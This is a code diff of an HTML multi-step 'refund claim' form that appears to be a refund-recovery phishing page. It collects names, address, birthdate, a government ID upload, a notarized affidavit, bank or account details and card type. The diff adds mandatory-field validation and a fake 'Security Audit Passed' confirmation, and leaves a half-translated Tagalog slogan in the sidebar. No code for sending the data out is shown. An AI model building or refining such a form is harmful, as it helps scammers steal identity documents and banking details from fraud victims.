@@ -35,18 +35,20 @@
         .header h1 { color: var(--hamburg-blue); margin: 0; font-size: 32px; font-weight: 900; text-transform: uppercase; border: 2px solid var(--hamburg-blue); display: inline-block; padding: 10px 20px; }
         .header .declaration { margin: 20px auto 0; color: #333; font-weight: 800; font-size: 13px; text-transform: uppercase; letter-spacing: 0.5px; max-width: 750px; line-height: 1.5; }
         
-        /* SECTION CONTROL */
         .section-box { padding: 50px; display: none; }
         .section-box.active { display: block; }
         
-        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 30px; font-weight: 800; text-transform: uppercase; border-bottom: 2px solid #eee; padding-bottom: 15px; }
+        h2 { font-size: 20px; color: var(--hamburg-blue); margin-bottom: 10px; font-weight: 800; text-transform: uppercase; }
+        .instruction-text { font-size: 13px; color: #555; margin-bottom: 25px; line-height: 1.5; border-bottom: 1px solid #eee; padding-bottom: 15px; }
         
         .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 20px; }
         .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 25px; }
         
         label { display: block; font-weight: 800; margin-bottom: 10px; font-size: 12px; color: var(--hamburg-blue); text-transform: uppercase; }
-        input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; }
-        input::placeholder { color: #888; font-weight: normal; }
+        input, select { width: 100%; padding: 16px; border: 1px solid #bbb; box-sizing: border-box; font-size: 15px; border-radius: 2px; transition: 0.2s; }
+        
+        /* VALIDATION ERROR STYLE */
+        input.invalid, select.invalid { border: 2px solid var(--hamburg-red); background-color: #fff8f8; }
 
         .btn-container { display: flex; justify-content: flex-end; margin-top: 40px; gap: 15px; }
         button { background-color: var(--hamburg-blue); color: white; border: none; padding: 20px 60px; cursor: pointer; font-size: 15px; font-weight: 900; text-transform: uppercase; transition: 0.3s; }
@@ -76,41 +78,61 @@
                 <div id="section1" class="section-box active">
                     <h2>SECTION 1: IDENTITY & NATIONALITY</h2>
                     <div class="grid-3">
-                        <div><label>Last Name *</label><input type="text" placeholder="Enter Last Name"></div>
-                        <div><label>First Name *</label><input type="text" placeholder="Enter First Name"></div>
-                        <div><label>Middle Name *</label><input type="text" placeholder="Enter Middle Name"></div>
+                        <div><label>Last Name *</label><input type="text" class="req" placeholder="Enter Last Name"></div>
+                        <div><label>First Name *</label><input type="text" class="req" placeholder="Enter First Name"></div>
+                        <div><label>Middle Name *</label><input type="text" class="req" placeholder="Enter Middle Name"></div>
                     </div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Personal Email Address *</label><input type="email" placeholder="Enter Email"></div>
-                        <div><label>Nationality *</label><input type="text" placeholder="Enter Nationality"></div>
+                        <div><label>Personal Email Address *</label><input type="email" class="req" placeholder="Enter Email"></div>
+                        <div><label>Nationality *</label><input type="text" class="req" placeholder="Enter Nationality"></div>
                     </div>
-                    <div style="margin-top:25px;"><label>Residential Address *</label><input type="text" placeholder="Enter Residential Address"></div>
+                    <div style="margin-top:25px;"><label>Residential Address *</label><input type="text" class="req" placeholder="Enter Residential Address"></div>
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Birthdate *</label><input type="text" placeholder="MM / DD / YYYY"></div>
-                        <div><label>Contact Number *</label><input type="text" placeholder="Enter Number"></div>
+                        <div><label>Birthdate *</label><input type="text" class="req" placeholder="MM / DD / YYYY"></div>
+                        <div><label>Contact Number *</label><input type="text" class="req" placeholder="Enter Number"></div>
                     </div>
-                    <div style="margin-top:25px;"><label>Upload Valid Government ID *</label><input type="file"></div>
-                    <div class="btn-container"><button type="button" onclick="nextPage(2)">NEXT STEP</button></div>
+                    <div style="margin-top:25px;"><label>Upload Valid Government ID *</label><input type="file" class="req"></div>
+                    <div class="btn-container"><button type="button" onclick="validateAndNext(2)">NEXT STEP</button></div>
                 </div>
 
                 <!-- SECTION 2 -->
                 <div id="section2" class="section-box">
-                    <h2>SECTION 2: SECURITY & DISBURSEMENT</h2>
-                    <div class="grid-2">
-                        <div><label>Refund Amount (EUR) *</label><input type="number" placeholder="€ 0.00"></div>
-                        <div><label>Transaction Receipt *</label><input type="file"></div>
+                    <h2>MANDATORY REFUND VERIFICATION</h2>
+                    <p class="instruction-text">Please provide the total refund amount requested. You are required to upload a clear copy of your Notarized Affidavit as official proof of claim.</p>
+
+                    <div>
+                        <label>TOTAL REFUND AMOUNT *</label>
+                        <input type="text" class="req" placeholder="Enter Amount">
                     </div>
-                    <div style="margin-top:25px;"><label>Bank Institution Name *</label><input type="text" placeholder="Enter Bank Name"></div>
+
+                    <div style="margin-top:25px;">
+                        <label>UPLOAD RECEIPT *</label>
+                        <input type="file" class="req">
+                    </div>
+
+                    <h2 style="margin-top:40px;">REFUND DISBURSEMENT INFORMATION</h2>
+                    <p class="instruction-text">Please ensure that all banking information provided is accurate.</p>
+
+                    <div>
+                        <label>Bank Name / Third Party Bank Application *</label>
+                        <input type="text" class="req" placeholder="Enter Bank Name">
+                    </div>
+
                     <div class="grid-2" style="margin-top:25px;">
-                        <div><label>Account / IBAN Number *</label><input type="text" placeholder="Enter Number"></div>
+                        <div><label>ACCOUNT NUMBER *</label><input type="text" class="req" placeholder="Enter Number"></div>
                         <div>
-                            <label>Disbursement Method *</label>
-                            <select><option value="">Select Method...</option><option>Bank Transfer</option><option>Card Refund</option></select>
+                            <label>TYPE OF CARD *</label>
+                            <select class="req">
+                                <option value="">Select...</option>
+                                <option>Debit Card</option>
+                                <option>Credit Card</option>
+                            </select>
                         </div>
                     </div>
+
                     <div class="btn-container">
-                        <button type="button" class="btn-back" onclick="nextPage(1)">BACK</button>
-                        <button type="button">SUBMIT CLAIM</button>
+                        <button type="button" class="btn-back" onclick="goToPage(1)">BACK</button>
+                        <button type="button" onclick="validateAndSubmit()">SUBMIT CLAIM</button>
                     </div>
                 </div>
             </form>
@@ -123,15 +145,49 @@
 
         <div class="side-text">
             <h3>VISION</h3>
-            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, where a culture of absolute transparency and sophisticated security ensures that every individual can navigate the refund ecosystem with unwavering confidence and total protection from deceptive practices.</p>
+            <p>To be recognized as the premier global benchmark for commercial integrity and consumer safety, kung saan ang bawat indibidwal ay makakapag-navigate nang may kumpiyansa at proteksyon.</p>
         </div>
     </div>
 
     <script>
-        function nextPage(pageNumber) {
+        function validateAndNext(pageNum) {
+            const currentSection = document.querySelector('.section-box.active');
+            const inputs = currentSection.querySelectorAll('.req');
+            let isValid = true;
+
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    input.classList.add('invalid');
+                    isValid = false;
+                } else {
+                    input.classList.remove('invalid');
+                }
+            });
+
+            if (isValid) goToPage(pageNum);
+        }
+
+        function goToPage(pageNum) {
             document.querySelectorAll('.section-box').forEach(box => box.classList.remove('active'));
-            document.getElementById('section' + pageNumber).classList.add('active');
+            document.getElementById('section' + pageNum).classList.add('active');
             window.scrollTo(0, 0);
+        }
+
+        function validateAndSubmit() {
+            const currentSection = document.querySelector('.section-box.active');
+            const inputs = currentSection.querySelectorAll('.req');
+            let isValid = true;
+
+            inputs.forEach(input => {
+                if (!input.value.trim()) {
+                    input.classList.add('invalid');
+                    isValid = false;
+                } else {
+                    input.classList.remove('invalid');
+                }
+            });
+
+            if (isValid) alert("Security Audit Passed. Claim Submitted to Processing Unit.");
         }
     </script>
 </body>
